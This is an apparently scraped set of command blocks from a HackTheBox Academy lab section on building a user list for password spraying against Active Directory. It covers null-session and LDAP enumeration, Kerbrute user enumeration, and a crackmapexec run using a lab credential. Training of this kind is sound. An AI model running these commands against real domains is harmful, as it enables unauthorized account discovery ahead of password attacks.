# Section 10: Password Spraying - Making a Target User List

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1455
- Code/command blocks: 7

> Terminal output is omitted; only commands & scripts are captured.

```bash
enum4linux -U {{DC_IP}}  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

```bash
rpcclient -U "" -N {{DC_IP}}
```

```bash
crackmapexec smb {{DC_IP}} --users
```

```bash
ldapsearch -h {{DC_IP}} -x -b "DC={{DOMAIN_NB}},DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

```bash
./windapsearch.py --dc-ip {{DC_IP}} -u "" -U
```

```bash
 kerbrute userenum -d {{DOMAIN}} --dc {{DC_IP}} /opt/jsmith.txt 
```

```bash
sudo crackmapexec smb {{DC_IP}} -u htb-student -p Academy_student_AD! --users
```

